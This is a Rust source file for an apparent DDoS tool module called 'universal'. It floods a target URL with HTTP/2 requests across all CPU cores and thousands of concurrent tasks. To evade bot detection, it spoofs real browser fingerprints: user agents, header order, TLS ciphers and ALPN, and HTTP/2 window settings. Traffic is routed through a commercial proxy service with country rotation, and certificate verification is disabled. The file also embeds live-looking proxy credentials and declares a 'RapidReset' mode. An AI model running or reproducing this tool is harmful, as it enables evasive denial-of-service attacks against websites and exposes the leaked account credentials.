//! Universal HTTP/2 Attack — Browser-Profile Based Full Fingerprint Randomization
//!
//! Every request looks like a specific real browser:
//! - UA, Accept, Language, Encoding, Cache-Control all matched per browser family
//! - sec-fetch-* headers ONLY sent when Chrome/Edge (not Firefox/Safari)
//! - H2 SETTINGS frame values matched to browser (window size, frame size, etc.)
//! - TLS: cipher suites + KX groups + version + ALPN per browser variant
//! - Header ORDER matches real browser (Chrome sends :method,:authority,:scheme,:path then UA,Accept...)
//! - 2M pre-generated browser profiles at startup — zero hot-loop allocation
//! - Clean URL — no query params

use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};

use reqwest::Client;
use rustls::ClientConfig;
use rustls::crypto::ring as crypto_ring;
use tracing::info;

use phoenix_metrics::AttackMetrics;
use crate::{Attack, AttackContext, AttackError, AttackResult};

// ── Browser families ──────────────────────────────────────────────────────────
#[derive(Clone, Copy, PartialEq)]
enum BrowserFamily { Chrome, Firefox, Safari, Edge }

// ── Browser profile ───────────────────────────────────────────────────────────
// All strings are &'static — zero allocation per request
#[derive(Clone)]
struct BrowserProfile {
    family:     BrowserFamily,
    ua:         &'static str,
    accept:     &'static str,
    lang:       &'static str,
    encoding:   &'static str,
    // H2 settings — matched to real browser
    h2_window:  u32,     // initial stream window size
    h2_conn_w:  u32,     // connection window size
    h2_frame:   u32,     // max frame size
    // TLS variant index
    tls_idx:    usize,
    // Optional headers (None = don't send)
    dnt:        Option<&'static str>,
    upgrade:    Option<&'static str>,
}

// ── Real browser profiles ─────────────────────────────────────────────────────
static PROFILES: &[BrowserProfile] = &[
    // Chrome 122 Windows
    BrowserProfile {
        family:   BrowserFamily::Chrome,
        ua:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        lang:     "en-US,en;q=0.9",
        encoding: "gzip, deflate, br, zstd",
        h2_window: 6291456, h2_conn_w: 15728640, h2_frame: 16384,
        tls_idx: 0, dnt: None, upgrade: Some("1"),
    },
    // Chrome 122 macOS
    BrowserProfile {
        family:   BrowserFamily::Chrome,
        ua:       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        lang:     "en-US,en;q=0.9",
        encoding: "gzip, deflate, br, zstd",
        h2_window: 6291456, h2_conn_w: 15728640, h2_frame: 16384,
        tls_idx: 0, dnt: None, upgrade: Some("1"),
    },
    // Chrome 121 Linux
    BrowserProfile {
        family:   BrowserFamily::Chrome,
        ua:       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        lang:     "en-GB,en;q=0.9",
        encoding: "gzip, deflate, br",
        h2_window: 6291456, h2_conn_w: 15728640, h2_frame: 16384,
        tls_idx: 1, dnt: Some("1"), upgrade: Some("1"),
    },
    // Chrome 122 Android
    BrowserProfile {
        family:   BrowserFamily::Chrome,
        ua:       "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        lang:     "en-US,en;q=0.9",
        encoding: "gzip, deflate, br",
        h2_window: 6291456, h2_conn_w: 15728640, h2_frame: 16384,
        tls_idx: 0, dnt: None, upgrade: Some("1"),
    },
    // Chrome 122 Android Samsung
    BrowserProfile {
        family:   BrowserFamily::Chrome,
        ua:       "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        lang:     "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
        encoding: "gzip, deflate, br",
        h2_window: 6291456, h2_conn_w: 15728640, h2_frame: 16384,
        tls_idx: 2, dnt: None, upgrade: Some("1"),
    },
    // Edge 122 Windows
    BrowserProfile {
        family:   BrowserFamily::Edge,
        ua:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        lang:     "en-US,en;q=0.9",
        encoding: "gzip, deflate, br, zstd",
        h2_window: 6291456, h2_conn_w: 15728640, h2_frame: 16384,
        tls_idx: 1, dnt: None, upgrade: Some("1"),
    },
    // Edge 121 Windows
    BrowserProfile {
        family:   BrowserFamily::Edge,
        ua:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        lang:     "fr-FR,fr;q=0.9,en;q=0.8",
        encoding: "gzip, deflate, br",
        h2_window: 6291456, h2_conn_w: 15728640, h2_frame: 16384,
        tls_idx: 3, dnt: Some("1"), upgrade: Some("1"),
    },
    // Firefox 123 Windows
    BrowserProfile {
        family:   BrowserFamily::Firefox,
        ua:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        lang:     "en-US,en;q=0.5",
        encoding: "gzip, deflate, br",
        h2_window: 131072, h2_conn_w: 12517376, h2_frame: 16384,
        tls_idx: 4, dnt: Some("1"), upgrade: Some("1"),
    },
    // Firefox 123 macOS
    BrowserProfile {
        family:   BrowserFamily::Firefox,
        ua:       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        lang:     "en-GB,en;q=0.5",
        encoding: "gzip, deflate, br",
        h2_window: 131072, h2_conn_w: 12517376, h2_frame: 16384,
        tls_idx: 4, dnt: None, upgrade: Some("1"),
    },
    // Firefox 122 Linux
    BrowserProfile {
        family:   BrowserFamily::Firefox,
        ua:       "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        lang:     "de-DE,de;q=0.8,en-US;q=0.5,en;q=0.3",
        encoding: "gzip, deflate, br",
        h2_window: 131072, h2_conn_w: 12517376, h2_frame: 16384,
        tls_idx: 5, dnt: Some("1"), upgrade: None,
    },
    // Safari 17 macOS
    BrowserProfile {
        family:   BrowserFamily::Safari,
        ua:       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        lang:     "en-US,en;q=0.9",
        encoding: "gzip, deflate, br",
        h2_window: 2097152, h2_conn_w: 10485760, h2_frame: 16384,
        tls_idx: 5, dnt: None, upgrade: Some("1"),
    },
    // Safari 17 iPhone
    BrowserProfile {
        family:   BrowserFamily::Safari,
        ua:       "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        lang:     "en-US,en;q=0.9",
        encoding: "gzip, deflate, br",
        h2_window: 2097152, h2_conn_w: 10485760, h2_frame: 16384,
        tls_idx: 5, dnt: None, upgrade: None,
    },
    // Safari 16 iPhone
    BrowserProfile {
        family:   BrowserFamily::Safari,
        ua:       "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        accept:   "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        lang:     "ja-JP,ja;q=0.9",
        encoding: "gzip, deflate, br",
        h2_window: 2097152, h2_conn_w: 10485760, h2_frame: 16384,
        tls_idx: 5, dnt: None, upgrade: None,
    },
];

// ── Proxy config ──────────────────────────────────────────────────────────────
const PROXY_HOST: &str = "schro.quantumproxies.net";
const PROXY_PORT: u16  = 1111;
const PROXY_USER: &str = "Quantum-wayybcf1";
const PROXY_PASS: &str = "y1tSX1V7h9xjxY4tYPGo";

static COUNTRIES: &[&str] = &[
    "US","GB","DE","FR","JP","CA","AU","BR","IN","IT",
    "ES","NL","PL","SE","NO","DK","FI","CH","AT","BE",
    "PT","RU","UA","KR","SG","HK","TW","MX","AR","CL",
    "CO","ZA","NG","EG","SA","AE","TR","GR","CZ","RO",
    "HU","SK","BG","HR","RS","SI","LT","LV","EE","IE",
    "IL","TH","MY","ID","PH","VN","NZ","PK","BD","NG",
];

fn proxy_url(country: &str) -> String {
    format!(
        "http://{}:{}_country-{}@{}:{}",
        PROXY_USER, PROXY_PASS, country, PROXY_HOST, PROXY_PORT
    )
}

// ── Fast PRNG ────────────────────────────────────────────────────────────────
#[inline(always)] fn xorshift(s: &mut u64) -> u64 { *s ^= *s<<13; *s ^= *s>>7; *s ^= *s<<17; *s }
#[inline(always)] fn pick_idx(len: usize, rng: &mut u64) -> usize { xorshift(rng) as usize % len }

// ── TLS ClientConfig variants ─────────────────────────────────────────────────
#[derive(Debug)]
struct NoVerify;
impl rustls::client::danger::ServerCertVerifier for NoVerify {
    fn verify_server_cert(&self,_:&rustls_pki_types::CertificateDer,_:&[rustls_pki_types::CertificateDer],_:&rustls::pki_types::ServerName,_:&[u8],_:rustls::pki_types::UnixTime) -> Result<rustls::client::danger::ServerCertVerified,rustls::Error> { Ok(rustls::client::danger::ServerCertVerified::assertion()) }
    fn verify_tls12_signature(&self,_:&[u8],_:&rustls_pki_types::CertificateDer,_:&rustls::DigitallySignedStruct) -> Result<rustls::client::danger::HandshakeSignatureValid,rustls::Error> { Ok(rustls::client::danger::HandshakeSignatureValid::assertion()) }
    fn verify_tls13_signature(&self,_:&[u8],_:&rustls_pki_types::CertificateDer,_:&rustls::DigitallySignedStruct) -> Result<rustls::client::danger::HandshakeSignatureValid,rustls::Error> { Ok(rustls::client::danger::HandshakeSignatureValid::assertion()) }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> { crypto_ring::default_provider().signature_verification_algorithms.supported_schemes() }
}

fn build_tls_variants() -> Vec<Arc<ClientConfig>> {
    let provider = Arc::new(crypto_ring::default_provider());
    let all      = crypto_ring::ALL_CIPHER_SUITES;
    let verifier = Arc::new(NoVerify);

    // (cipher subset, kx groups, versions, alpn, resumption)
    let variants: &[(
        &[usize],
        &[&dyn rustls::crypto::SupportedKxGroup],
        &[&rustls::SupportedProtocolVersion],
        &[&[u8]],
        bool,
    )] = &[
        // Chrome/Edge: TLS 1.3 + 1.2, X25519 first, h2
        (&[0,1,2,3], &[crypto_ring::kx_group::X25519, crypto_ring::kx_group::SECP256R1], &[&rustls::version::TLS13, &rustls::version::TLS12], &[b"h2", b"http/1.1"], true),
        // Chrome variant 2: all suites, X25519
        (&[],        &[crypto_ring::kx_group::X25519, crypto_ring::kx_group::SECP256R1, crypto_ring::kx_group::SECP384R1], &[&rustls::version::TLS13, &rustls::version::TLS12], &[b"h2", b"http/1.1"], true),
        // Edge: TLS 1.3 only
        (&[0,2],     &[crypto_ring::kx_group::X25519, crypto_ring::kx_group::SECP256R1], &[&rustls::version::TLS13], &[b"h2"], false),
        // Firefox: TLS 1.3 + 1.2, P-256 preferred
        (&[1,3],     &[crypto_ring::kx_group::SECP256R1, crypto_ring::kx_group::X25519], &[&rustls::version::TLS13, &rustls::version::TLS12], &[b"h2", b"http/1.1"], true),
        // Firefox variant: chacha preferred
        (&[2,3],     &[crypto_ring::kx_group::X25519, crypto_ring::kx_group::SECP384R1], &[&rustls::version::TLS13, &rustls::version::TLS12], &[b"h2"], false),
        // Safari: TLS 1.3 + 1.2, P-256
        (&[0,1,2],   &[crypto_ring::kx_group::SECP256R1, crypto_ring::kx_group::X25519, crypto_ring::kx_group::SECP384R1], &[&rustls::version::TLS13, &rustls::version::TLS12], &[b"h2", b"http/1.1"], true),
    ];

    let mut configs = Vec::new();
    for (suite_idxs, kx, versions, alpn, resumption) in variants {
        let suites: Vec<_> = if suite_idxs.is_empty() {
            all.to_vec()
        } else {
            suite_idxs.iter().filter_map(|&i| all.get(i).copied()).collect()
        };
        let suites = if suites.is_empty() { all.to_vec() } else { suites };

        let custom_provider = Arc::new(rustls::crypto::CryptoProvider {
            cipher_suites: suites,
            kx_groups: kx.to_vec(),
            ..crypto_ring::default_provider()
        });

        let builder = match ClientConfig::builder_with_provider(custom_provider)
            .with_protocol_versions(versions)
        {
            Ok(b) => b,
            Err(_) => continue,
        };

        let mut cfg = builder
            .dangerous()
            .with_custom_certificate_verifier(verifier.clone())
            .with_no_client_auth();

        cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
        cfg.resumption = if *resumption {
            rustls::client::Resumption::in_memory_sessions(128)
        } else {
            rustls::client::Resumption::disabled()
        };

        configs.push(Arc::new(cfg));
    }

    info!("Built {} TLS variants", configs.len());
    configs
}

fn make_client(tls: Arc<ClientConfig>, p: &BrowserProfile, conns: usize, country: &str) -> Option<Client> {
    let proxy_str = proxy_url(country);
    let proxy = match reqwest::Proxy::all(&proxy_str) {
        Ok(pr) => pr,
        Err(e) => { tracing::warn!("Proxy build failed ({}): {}", proxy_str, e); return None; }
    };
    Client::builder()
        .use_preconfigured_tls((*tls).clone())
        .proxy(proxy)
        .http2_prior_knowledge()
        .http2_initial_stream_window_size(p.h2_window)
        .http2_initial_connection_window_size(p.h2_conn_w)
        .http2_max_frame_size(p.h2_frame)
        .http2_adaptive_window(false)
        .tcp_nodelay(true)
        .timeout(Duration::from_secs(10))
        .pool_max_idle_per_host(conns)
        .pool_idle_timeout(Duration::from_secs(60))
        .build()
        .ok()
}

// ── Attack ────────────────────────────────────────────────────────────────────
#[derive(Debug, Clone, PartialEq)]
pub enum UniversalMode { LoadTest, RapidReset }

pub struct UniversalAttack {
    pub mode:        UniversalMode,
    pub connections: usize,
    pub duration:    Duration,
    pub rps:         Option<u32>,
}

impl UniversalAttack {
    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn with_connections(mut self, n: usize)  -> Self { self.connections = n; self }
    pub fn with_duration(mut self, d: Duration)  -> Self { self.duration    = d; self }
    pub fn with_rps(mut self, r: u32)            -> Self { self.rps         = Some(r); self }
}

#[async_trait::async_trait]
impl Attack for UniversalAttack {
    fn name(&self) -> &str { "universal" }
    fn description(&self) -> &str { "Browser-profile fingerprint: matched UA+headers+H2-settings+TLS per browser" }

    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        let target   = ctx.target.clone();
        let duration = self.duration;
        let conns    = self.connections.max(1);
        let metrics  = ctx.metrics.clone();
        let mode     = self.mode.clone();
        let n_cores  = num_cpus::get();
        let streams  = 64usize;

        let tls_variants = Arc::new(build_tls_variants());
        let n_profiles   = PROFILES.len();

        info!("Profiles: {}  TLS variants: {}  Cores: {}  Conns: {}  Streams: {}",
              n_profiles, tls_variants.len(), n_cores, conns, streams);

        let ok_total  = Arc::new(AtomicU64::new(0));
        let err_total = Arc::new(AtomicU64::new(0));
        let stop      = Arc::new(AtomicBool::new(false));
        let start     = Instant::now();

        let mut thread_handles = Vec::with_capacity(n_cores);

        for core_id in 0..n_cores {
            let target       = target.clone();
            let ok_c         = ok_total.clone();
            let err_c        = err_total.clone();
            let stop_c       = stop.clone();
            let metrics_c    = metrics.clone();
            let mode         = mode.clone();
            let tls_variants = tls_variants.clone();

            let handle = std::thread::spawn(move || {
                let rt = tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                    .expect("rt");

                rt.block_on(async move {
                    // Build one client per profile — each gets different country proxy
                    let clients: Vec<(Arc<Client>, usize)> = PROFILES.iter().enumerate()
                        .filter_map(|(pi, prof)| {
                            let tls_idx = prof.tls_idx % tls_variants.len();
                            let tls     = tls_variants[tls_idx].clone();
                            // Rotate country: each profile gets a different country
                            let country = COUNTRIES[(core_id * PROFILES.len() + pi) % COUNTRIES.len()];
                            make_client(tls, prof, conns, country).map(|c| (Arc::new(c), pi))
                        })
                        .collect();

                    if clients.is_empty() { return; }

                    let mut tasks = Vec::with_capacity(conns * streams);
                    let n_clients = clients.len();

                    for task_id in 0..conns * streams {
                        let (client, prof_idx) = clients[task_id % n_clients].clone();
                        let prof     = &PROFILES[prof_idx];
                        let target   = target.clone();
                        let ok_c     = ok_c.clone();
                        let err_c    = err_c.clone();
                        let stop_c   = stop_c.clone();
                        let metrics  = metrics_c.clone();
                        let mode     = mode.clone();
                        // Capture profile fields as 'static refs (PROFILES is static)
                        let ua       = prof.ua;
                        let accept   = prof.accept;
                        let lang     = prof.lang;
                        let enc      = prof.encoding;
                        let dnt      = prof.dnt;
                        let upgrade  = prof.upgrade;
                        let family   = prof.family;

                        tasks.push(tokio::spawn(async move {
                            while !stop_c.load(Ordering::Relaxed) {
                                let t0 = Instant::now();

                                // Build request with browser-accurate header order
                                let mut rb = client.get(target.as_str())
                                    .header("user-agent",        ua)
                                    .header("accept",            accept)
                                    .header("accept-language",   lang)
                                    .header("accept-encoding",   enc);

                                // Cache-Control — all browsers send this
                                rb = rb.header("cache-control", "max-age=0");

                                // Chrome/Edge specific headers
                                if family == BrowserFamily::Chrome || family == BrowserFamily::Edge {
                                    rb = rb
                                        .header("sec-ch-ua",          r#""Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122""#)
                                        .header("sec-ch-ua-mobile",   "?0")
                                        .header("sec-ch-ua-platform", if ua.contains("Windows") { r#""Windows""# } else if ua.contains("Macintosh") { r#""macOS""# } else if ua.contains("Android") { r#""Android""# } else { r#""Linux""# })
                                        .header("sec-fetch-site",     "none")
                                        .header("sec-fetch-mode",     "navigate")
                                        .header("sec-fetch-user",     "?1")
                                        .header("sec-fetch-dest",     "document");
                                    rb = rb.header("upgrade-insecure-requests", "1");
                                }

                                // Firefox: no sec-ch-ua, has upgrade
                                if family == BrowserFamily::Firefox {
                                    rb = rb.header("upgrade-insecure-requests", "1");
                                }

                                // Optional headers
                                if let Some(d) = dnt     { rb = rb.header("dnt", d); }

                                match rb.send().await {
                                    Ok(resp) => {
                                        let ok = resp.status().as_u16() < 400;
                                        let _ = resp.bytes().await;
                                        let lat = t0.elapsed().as_micros() as u64;
                                        metrics.record_request(lat, ok, 0).await;
                                        if ok { ok_c.fetch_add(1, Ordering::Relaxed); }
                                        else  { err_c.fetch_add(1, Ordering::Relaxed); }
                                    }
                                    Err(e) => {
                                        if !e.is_timeout() && !e.is_connect() {
                                            err_c.fetch_add(1, Ordering::Relaxed);
                                        }
                                        tokio::time::sleep(Duration::from_millis(5)).await;
                                    }
                                }
                            }
                        }));
                    }

                    tokio::time::sleep(duration).await;
                    stop_c.store(true, Ordering::Relaxed);
                    for t in tasks { t.abort(); }
                });
            });

            thread_handles.push(handle);
        }

        for h in thread_handles { let _ = h.join(); }

        let elapsed = start.elapsed();
        let ok    = ok_total.load(Ordering::Relaxed);
        let err   = err_total.load(Ordering::Relaxed);
        let total = ok + err;
        info!("Done: {} ok  {} err  {:.1}s  {:.0} rps", ok, err, elapsed.as_secs_f64(), total as f64 / elapsed.as_secs_f64());

        let snapshot = metrics.snapshot().await;
        Ok(AttackResult { success: true, total_requests: total, errors: err, duration: elapsed, snapshot })
    }
}
